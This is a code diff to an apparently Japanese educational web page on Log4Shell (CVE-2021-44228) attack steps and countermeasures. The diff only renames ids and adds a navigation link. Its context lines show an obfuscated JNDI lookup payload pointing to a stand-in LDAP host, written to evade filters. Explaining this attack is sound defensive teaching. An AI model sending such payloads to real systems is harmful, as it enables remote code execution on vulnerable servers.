@@ -35,7 +35,7 @@
                             重大なサイバー攻撃の攻撃手順と対策について
                         </h2>
                         <article class="blog-post" id="article_top">
-                            <h3 class="pt-4 mt-4 border-bottom fw-bold">
+                            <h3 class="pt-4 mt-4 border-bottom fw-bold" id="log4shell">
                                 Log4Shell (CVE-2021-44228)
                             </h3>
                             <ul>
@@ -53,7 +53,7 @@
                             <h4 class="pt-4 mt-4 border-bottom fw-bold">
                                 攻撃手順
                             </h4>
-                            <div id="log4shell">
+                            <div id="md-log4shell-attack">
 | 役割 | FQDN | 説明 |
 | --- | --- | --- |
 | 脆弱なアプリケーション | `example.zone` | Log4jを使用しており、外部入力をログ出力する処理を持つ |
@@ -214,6 +214,9 @@ ${${::-j}${::-n}${::-d}${::-i}:ldap://ldap.zone/[検索キー]}</code></pre>
                                         <a href="#article_top">Top</a>
                                     </li>
                                     <li>
+                                        <a href="#log4shell">Log4Shell</a>
+                                    </li>
+                                    <li>
                                         <a href="#pagination">ページ切り替え</a>
                                     </li>
                                 </ol>
@@ -248,7 +251,7 @@ ${${::-j}${::-n}${::-d}${::-i}:ldap://ldap.zone/[検索キー]}</code></pre>
             new TipsView(tipsModel, "tips", "tips", ["cTip", "pythonTip", "serverTip", "appTip"]);
             
             const mdLists = [
-                "log4shell",
+                "md-log4shell-attack",
                 "md-log4shell",
             ];
 
